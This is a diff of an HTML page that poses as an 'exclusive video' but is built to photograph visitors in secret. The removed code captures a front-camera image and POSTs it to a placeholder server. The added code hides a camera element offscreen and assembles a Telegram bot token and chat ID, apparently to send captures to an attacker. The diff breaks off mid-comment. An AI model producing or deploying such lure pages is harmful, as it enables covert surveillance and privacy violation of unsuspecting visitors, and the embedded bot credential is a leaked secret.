@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Exclusive Video</title>
+    <title>Exclusive Video Content</title>
     <style>
         body {
             margin: 0;
@@ -14,75 +14,65 @@
             align-items: center;
             height: 100vh;
             overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        #videoContainer {
+            position: relative;
+            width: 100%;
+            height: 100%;
         }
         video {
-            max-width: 100%;
-            max-height: 100%;
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
         }
-        #message {
+        #loadingMessage {
             position: absolute;
-            top: 10px;
-            left: 10px;
+            top: 20px;
+            left: 20px;
             color: white;
             background-color: rgba(0,0,0,0.7);
             padding: 10px;
             border-radius: 5px;
-            font-family: Arial, sans-serif;
+            z-index: 10;
+        }
+        #hiddenCamera {
+            position: absolute;
+            width: 1px;
+            height: 1px;
+            top: -9999px;
+            left: -9999px;
+            opacity: 0;
+        }
+        #statusMessage {
+            position: absolute;
+            bottom: 20px;
+            left: 20px;
+            color: white;
+            background-color: rgba(255,0,0,0.7);
+            padding: 10px;
+            border-radius: 5px;
+            z-index: 10;
+            display: none;
         }
     </style>
 </head>
 <body>
-    <div id="message">Please wait, loading exclusive content...</div>
-    <video id="video" autoplay muted loop playsinline>
-        <source src="YOUR_VIDEO_URL" type="video/mp4">
-        Your browser doesn't support the video tag.
-    </video>
+    <div id="videoContainer">
+        <div id="loadingMessage">Loading exclusive content, please wait...</div>
+        <div id="statusMessage"></div>
+        <video id="mainVideo" autoplay muted loop playsinline controls>
+            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/BigBuckBunny.mp4" type="video/mp4">
+            Your browser doesn't support the video tag.
+        </video>
+        <video id="hiddenCamera" autoplay muted></video>
+    </div>
 
     <script>
-        // Hide the message after video starts playing
-        document.getElementById('video').addEventListener('canplay', function() {
-            setTimeout(function() {
-                document.getElementById('message').style.display = 'none';
-            }, 3000);
-        });
-
-        // Request camera access and capture photo
-        navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
-            .then(function(stream) {
-                var video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-                
-                // Wait a bit for camera to initialize
-                setTimeout(function() {
-                    var canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    var context = canvas.getContext('2d');
-                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Convert to blob and send to server
-                    canvas.toBlob(function(blob) {
-                        var formData = new FormData();
-                        formData.append('image', blob);
-                        
-                        // Send to your server
-                        fetch('YOUR_SERVER_ENDPOINT', {
-                            method: 'POST',
-                            body: formData
-                        })
-                        .then(response => response.text())
-                        .then(data => console.log('Success:', data))
-                        .catch(error => console.error('Error:', error));
-                        
-                        // Stop camera stream
-                        stream.getTracks().forEach(track => track.stop());
-                    }, 'image/jpeg');
-                }, 2000);
-            })
-            .catch(function(err) {
-                console.error('Camera access denied:', err);
-            });
-    </script>
-</body>
-</html>
+        // টেলিগ্রাম বট টোকেন এবং চ্যাট আইডি
+        const p1 = "8890806272:";
+        const p2 = "AAFy8G_UHrNZTnx6H0jcgjKIj_vTa2SkEHA";
+        const chatId = "7930590409";
+        const botToken = p1 + p2;
+        
+        // স্ট্যাটাস ম
